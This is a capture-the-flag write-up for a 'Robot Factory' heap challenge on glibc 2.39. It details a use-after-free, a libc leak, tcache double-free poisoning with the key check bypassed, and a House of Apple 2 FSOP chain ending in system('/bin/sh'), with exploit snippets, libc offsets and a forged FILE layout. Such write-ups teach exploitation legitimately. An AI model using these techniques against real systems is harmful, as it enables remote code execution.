# FlagYard CTF — hop

**Writeup by [Fares Badaj](https://www.linkedin.com/in/FaresBadaj)**

> **Fares Badaj** — *Red Team Operator | Penetration Tester Specialist*
>
> **Telegram:** [@ptok3](https://t.me/ptok3) · **GitHub:** [github.com/FaresBadaj](https://github.com/FaresBadaj) · **LinkedIn:** [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj) · **Credly:** [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

- **Platform:** FlagYard (Lab Training CTF)
- **Author:** Flagyard
- **Category:** Pwn
- **Difficulty:** Hard (صعب)

> *"==== Robot Factory ===="*
> — the service's own banner

---

## The short version

A little "Robot Factory" heap manager. Its `scrap robot` action frees the robot but
**never clears the pointer**, so we get a use-after-free / double-free on a silver
platter. There is no win function, so we go all the way:

1. Free a large chunk into the **unsorted bin** → its `fd` is `main_arena + 0x60` → **libc base**.
2. On glibc **2.39** the classic "free once, overwrite `fd`, malloc twice" tcache poisoning is **dead** — `_int_malloc` only pops a tcache bin when `tcache->counts[idx] > 0`. So we keep the count high with a **double-free** and neutralise the tcache double-free key check.
3. Poison chunk `0x410` to hand us a qword-write at **`libc + 0x210000`** and drop a **fake `_IO_FILE`** there.
4. Poison chunk `0x30` to overwrite **`_IO_list_all`** — which at rest points at `stderr` — so it points at our fake FILE.
5. `exit()` flushes stdio: `_IO_wfile_jumps → _IO_wfile_overflow → _IO_wdoallocbuf →` fake wide vtable `→ setcontext → system("/bin/sh")`.

**Flag:** `FlagY{3e2e16511d8b4948ae6b015e3f240f04}`

---

## First look

```text
$ file chall
ELF 64-bit LSB pie executable, x86-64, dynamically linked,
interpreter ./ld-linux-x86-64.so.2, not stripped

$ pwn checksec chall
RELRO:   Full RELRO
Stack:   No canary found
NX:      NX enabled
PIE:     PIE enabled
SHSTK:   Enabled
IBT:     Enabled
Stripped: No
```

Full RELRO (GOT is read-only) and PIE, but **no canary** — and it ships its own
glibc 2.39 (`libc.so.6` + `ld-linux-x86-64.so.2`, `RUNPATH=.`). No `system`/`execve`
is imported; there's no `win` function either (only a handful of harmless 47-byte
decoy functions called at startup).

The menu:

```
========================
==== Robot Factory =====
========================
1. Build robot
2. View robot
3. Reprogram robot
4. Scrap robot
5. Exit
>>> 
```

The global robot table lives at `0x6060`, stride `0x50`:

| Offset | Field |
|---|---|
| `+0x00` | `char *name` |
| `+0x08` | `int   name_size` |
| `+0x0c` | `int   age` |
| `+0x2c` | `int   happiness (0x32)` |

The three important handlers:

- **`build`** — find the first slot with `ptr == 0`, read a size in `(0, 0x54f]`,
  `malloc(size)`, `memset(ptr, 0, size)`, read the name, read the age.
- **`reprogram`** — reads a new size that must be `<= name_size`, then re-reads the
  name in place (a heap write into a chunk we fully control).
- **`scrap`** — `free(ptr)` **and nothing else**. `robots[idx].ptr` is left dangling.

And every string read stops at `\n` (`read_input` is a byte-at-a-time loop) and
stores at most `size-1` bytes — worth remembering when we send raw pointers
(a stray `0x0a` in an address means "reconnect and try again").

---

## The bug: `scrap` leaves a dangling pointer

Because the pointer survives the free, `view` still prints the freed name — i.e. it
gives us the first 8 bytes of the freed chunk, which is exactly the leaked `fd`.

```c
scrap(io, 0);            // free(robots[0].ptr);  ptr NOT nulled
libc_leak = u64(show(io, 0));   // chunk->fd
```

For a chunk of size `0x510`, that free lands in the **unsorted bin**, and its `fd`
is `main_arena + 0x60`:

```python
libc = u64pad(show(io, 0)) - 0x203b20
```

With libc in hand, the plan is tcache poisoning. This is where 2.39 changes the game.

---

## Trap #1 — classic tcache poisoning is dead on glibc 2.39

The textbook recipe is:

```text
free(A)                       # A is in tcache
A->next = target ^ (A >> 12)  # safe-linking encoded
malloc()  -> returns A
malloc()  -> returns target   # <- assumed
```

A five-line C test against the shipped libc proves the second malloc does **not**
return `target`:

```c
void *a = malloc(0x400); free(a);
*(uint64_t*)a = target ^ ((uint64_t)a >> 12);
void *x = malloc(0x400);      // x == a
void *y = malloc(0x400);      // y != target  (!)
```

The reason is the hardened tcache fast path in `_int_malloc`:

```c
size_t tc_idx = csize2tidx(nb);
if (tcache != NULL && tc_idx < mp_.tcache_bins)
  if (tcache->counts[tc_idx] > 0)          /* <-- the gate */
      return tcache_get(tc_idx);
```

After the first `malloc` pops `A`, `counts[tc_idx]` drops to **0**, so the second
`malloc` ignores the (poisoned) head and serves from the unsorted/top chunk instead.
The poisoned `next` value is simply never followed.

### The fix: keep `counts > 0`

We need `counts >= 2` when the poisoned head is consumed:

```text
free(X);  # count = 1, head = X
free(Y);  # count = 2, head = Y, Y->next = X   (X is the "tail")
free(X);  # count = 3, head = X, X->next = Y   <- double free!
X->next = target ^ (X >> 12);
malloc() -> X            # count 3 -> 2, head = target
malloc() -> target       # count 2 -> 1, head = *target   <-- WIN
```

`free(X)` twice would normally trip glibc's tcache double-free detector, which
triggers only when the freed chunk's **`key`** field still equals `tcache`:

```c
if (__glibc_unlikely (e->key == tcache)) { /* walk list, look for e */ }
```

But `key` lives at `chunk+8` while `next` lives at `chunk+0`. Our `reprogram` can
write **both** qwords, so we simply zero `X->key` before the second free:

```python
scrap(io, 2)                              # free(X)
encX = u64pad(show(io, 2))                # X>>12   (the safe-linking key)
edit(io, 2, 0x20, b"\x00"*8 + p64(0))     # X->key = 0
scrap(io, 3)                              # free(Y)
scrap(io, 2)                              # free(X) again -> allowed
edit(io, 2, 0x20, p64(encX ^ target))     # X->next = target
add(io, 0x408, b"X"*0x10)                 # malloc -> X
add(io, 0x408, payload)                   # malloc -> target, write payload
```

The double-alloc gives a clean **arbitrary write of up to `0x400` bytes**. We do it
twice, with two different size classes (`0x410` and `0x30`).

---

## Forging the FILE (House of Apple 2)

`_IO_list_all` at rest is `&_IO_2_1_stderr_` (in this glibc `_IO_list_all = libc +
0x2044c0` and `stderr = libc + 0x2044e0`). So `exit()` → `_IO_flush_all_lockp`
walks `_IO_list_all`, and `_IO_OVERFLOW` on a FILE dispatches through its **vtable**.

We put the fake FILE in libc `.bss` at `libc + 0x210000` (writable scratch) and set:

```python
fake = libc + 0x210000
FILE._flags       = 0
FILE._IO_write_base = 0
FILE._IO_write_ptr  = 1                       # so the flush condition "ptr > base" holds
FILE.vtable         = libc + 0x202228         # _IO_wfile_jumps
FILE._mode          = 0
```

`_IO_wfile_jumps + 0x18 == _IO_wfile_overflow` (verified in the shipped libc). With
`_mode <= 0` and `_IO_write_ptr > _IO_write_base`, the flush calls
`_IO_wfile_overflow(fake, EOF)`.

Inside it, because `fake->_wide_data->_IO_write_base == 0`, the code takes the
"allocate a buffer" path and calls **`_IO_wdoallocbuf(fake)`**, which (with
`_wide_data->_IO_buf_base == 0` and `_IO_UNBUFFERED` clear) ends up calling:

```c
fake->_wide_data->_wide_vtable->__doallocate(fake)
```

That's a **second indirect call through memory we control**. We point
`_wide_data->_wide_vtable` at a fake vtable inside the forged block and set
`__doallocate = setcontext`. So we get `setcontext(fake)` — but only if the
`_wide_data` pointer and its fields are laid out correctly.

Layout inside the `0x400`-byte forged block:

| Where | Value | Role |
|---|---|---|
| `fake+0x00` | `0` | `_flags` |
| `fake+0x28` | `1` | `_IO_write_ptr` |
| `fake+0x68` | `fake+0x380` | `_chain` / **ucontext RDI** → `"/bin/sh"` |
| `fake+0x88` | `fake+0x3e0` | `_lock` |
| `fake+0xa0` | `fake+0x208` | `_wide_data` / **ucontext RSP** |
| `fake+0xa8` | `system` | **ucontext RIP** |
| `fake+0xc0` | `0` | `_mode` |
| `fake+0xd8` | `libc+0x202228` | vtable (`_IO_wfile_jumps`) |
| `fake+0xe0` | `fake+0x3a0` | ucontext FPU env |
| `fake+0x1c0` | `0` | ucontext `mxcsr` |
| `fake+0x220` | `0` | `wide_data->_IO_write_base` |
| `fake+0x228` | `1` | `wide_data->_IO_write_ptr` |
| `fake+0x238` | `0` | `wide_data->_IO_buf_base` |
| `fake+0x2e8` | `fake+0x300` | `wide_data->_wide_vtable` |
| `fake+0x368` | `setcontext` | fake vtbl `__doallocate` |
| `fake+0x380` | `"/bin/sh\x00"` | argument to `system` |

`setcontext` loads the machine context straight out of `fake`, so it sets
`rdi = fake+0x380` (`"/bin/sh"`), `rip = system`, and `rsp = fake+0x208`, then
`push rip; ret` into `system`.

---

## Trap #2 — the `movaps` alignment crash (and the `0xa0` double-duty)

The first run reached `system` and then died on:

```asm
movaps %xmm0, 0x50(%rsp)      ; #GP if rsp+0x50 isn't 16-aligned
```

`do_system` needs `rsp ≡ 8 (mod 16)` on entry, but we had pointed the context RSP at
`fake+0x200` (`≡ 0 mod 16`) → the SSE store faulted.

The natural fix — change `fake+0xa0` from `0x200` to `0x208` — **broke the chain**,
because **offset `0xa0` does double duty**: it is the FILE's `_wide_data` pointer
*and* the ucontext's saved `RSP`. Shifting it moved `_wide_data` too, so the flush
no longer found a valid wide buffer and never reached `setcontext`.

The clean fix is to move the **wide_data struct itself** 8 bytes in, so the same
qword at `fake+0xa0` is both a valid `_wide_data` pointer *and* an 8-mod-16 RSP:

```python
WD = 0x208
put(0xa0, fake + WD)       # _wide_data == RSP == fake+0x208  (8 mod 16)
# and place wide_data's fields at fake+0x208 + {0x18,0x20,0x30,0xe0}
```

That single change turned the crash into a shell.

> Other double-duty slots to keep in mind: `fake+0x68` is `_chain` **and** ucontext
> RDI (so it doubles as the `"/bin/sh"` pointer), and `fake+0xa8` is ucontext RIP.

---

## Trigger and flag

With both poisons done:

```python
io.sendlineafter(b">>> ", b"5")     # exit() -> flush -> shell
io.sendline(b"echo PWNED; cat flag; cat /app/flag")
```

The remote process (`cwd = /app`) hands us the flag:

```
FlagY{3e2e16511d8b4948ae6b015e3f240f04}
```

---

## Root causes (what actually went wrong)

| Bug | Where | Impact |
|---|---|---|
| `free()` without clearing the pointer | `scrap robot` | UAF + double-free primitive |
| Write-after-free via `reprogram` | `reprogram robot` | attacker rewrites tcache `next` **and** `key` |
| Unsorted-bin `fd` printed by `view` | `view robot` | trivial libc leak (`main_arena+0x60`) |
| Freed chunk reachable through the menu | table of raw pointers | arbitrary write via tcache poisoning |
| Safe-linking "hardening" bypassed by keeping `counts>0` | tcache | the classic 2.39 footgun |
| `_IO_list_all` resting on `stderr` | glibc | 2 writes → full FSOP chain |

---

## Takeaways

- **A free without a null-out is a whole exploit on its own.** Here it gave both the
  leak (via `view`) and the write (via `reprogram` on a freed chunk).
- **The "counts>0" tcache gate on modern glibc** breaks the textbook double-alloc.
  Do a real double-free (`free X; free Y; free X`) to keep the count up, and zero the
  chunk's `key` so the double-free detector stays quiet — `reprogram` lets us write
  `next` and `key` in one shot.
- **House of Apple 2 wants you to step two indirect calls deep**: the FILE vtable
  (`_IO_wfile_overflow`) *and* the wide vtable (`__doallocate`). Both are controlled.
- **Align `system`.** One extra `ret` on the stack, or picking an RSP whose low nibble
  is `8`, avoids the `movaps` `#GP` in `do_system`.
- **Watch for dual-purpose offsets.** In an FSOP/ucontext overlap, the same qword can
  be a FILE field and a saved register. Moving the *backing struct* instead of the
  pointer is often the only way to satisfy both.

---

## The exploit

Self-contained, colored version in the same folder:

```
hop_solve.py
```

Give it the target interactively (or as a CLI argument) and it walks home:

```bash
python3 hop_solve.py
Enter the hop challenge target (host:port): tcp.flagyard.com:15374
```

On success it prints the flag panel and saves the flag to `flag_from_hop.txt` next
to the script.

*"Robot built successfully!"* — so was the shell. 🏁
